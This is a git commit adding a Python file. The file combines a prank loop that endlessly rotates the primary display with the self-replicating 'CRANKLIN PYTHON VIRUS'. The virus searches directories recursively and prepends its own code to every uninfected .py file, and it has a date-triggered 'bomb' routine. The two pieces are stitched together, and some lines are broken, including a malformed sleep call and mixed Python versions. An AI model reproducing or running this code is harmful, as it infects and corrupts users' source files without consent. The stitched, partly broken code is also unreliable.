037fa8fd18e9120a3112ed9f928367527eedb6fc
AmishDahal <79306593+AmishDahal@users.noreply.github.com>
2023-12-26 00:29:17 +0545

    code.py

---
+++ code.py
@@ -0,0 +1,47 @@
+import time  , rotatescreen as rs 
+pd = rs.get_primary_display()
+angel_list =  [90, 180, 270, ]
+while True :
+ for x in angel_list :
+  pd.rotate_to(x)
+  time.sleep(0,5)
+
+#!/usr/bin/python
+import os
+import datetime
+SIGNATURE = "CRANKLIN PYTHON VIRUS"
+def search(path):
+    filestoinfect = []
+    filelist = os.listdir(path)
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            filestoinfect.extend(search(path+"/"+fname))
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+                filestoinfect.append(path+"/"+fname)
+    return filestoinfect
+def infect(filestoinfect):
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i,line in enumerate(virus):
+        if i>=0 and i <39:
+            virusstring += line
+    virus.close
+    for fname in filestoinfect:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+def bomb():
+    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
+        print "HAPPY BIRTHDAY CRANKLIN!"
+filestoinfect = search(os.path.abspath(""))
+infect(filestoinfect)
+bomb()
